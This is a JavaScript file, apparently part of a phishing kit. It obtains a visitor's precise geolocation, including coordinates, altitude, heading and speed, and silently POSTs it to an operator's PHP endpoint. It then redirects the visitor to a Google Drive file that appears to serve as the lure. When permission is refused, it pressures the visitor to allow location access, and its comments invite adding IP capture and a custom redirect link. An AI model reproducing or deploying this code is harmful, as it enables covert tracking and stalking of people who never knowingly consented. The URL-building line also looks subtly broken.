function locate() {
	if (navigator.geolocation) {
		var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
		navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
		// (success, error, [option])
		// success = A callback function that takes a GeolocationPosition object as its sole input parameter.
		// An optional callback function that takes a GeolocationPositionError object as its sole input paramete
	} else {
		alert("Geolocation is not Supported by your Browser...");
	}

	function showPosition(position) {
		var lat = position.coords.latitude;
		var lon = position.coords.longitude;
		var acc = position.coords.accuracy;
		var alt = position.coords.altitude;
		var dir = position.coords.heading;
		var spd = position.coords.speed;

		// Can add IP functionality here
		$.ajax({
			type: "POST",
			// here
			url: $("#base_url") + "/php/result.php",
			data: { Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
			// You will add the link of redirection link here
			success: function () {
				window.location =
					"https://drive.google.com/file/d/1uuuk5luoj4D8SyiXshl1CGmyfBVk_2cM/view";
			},
			mimeType: "text",
		});
	}
}

function showError(error) {
	switch (error.code) {
		case error.PERMISSION_DENIED:
			var denied = "User denied the request for Geolocation";
			alert("Please Refresh This Page and Allow Location Permission...");
			break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = "Location information is unavailable";
			break;
		case error.TIMEOUT:
			var timeout = "The request to get user location timed out";
			alert("Please Set Your Location Mode on High Accuracy...");
			break;
		case error.UNKNOWN_ERROR:
			var unknown = "An unknown error occurred";
			break;
	}

	$.ajax({
		type: "POST",
		// here
		url: $("#base_url") + "/php/error.php",
		data: { Denied: denied, Una: unavailable, Time: timeout, Unk: unknown },
		success: function () {
			$("#change").html("Failed");
		},
		mimeType: "text",
	});
}
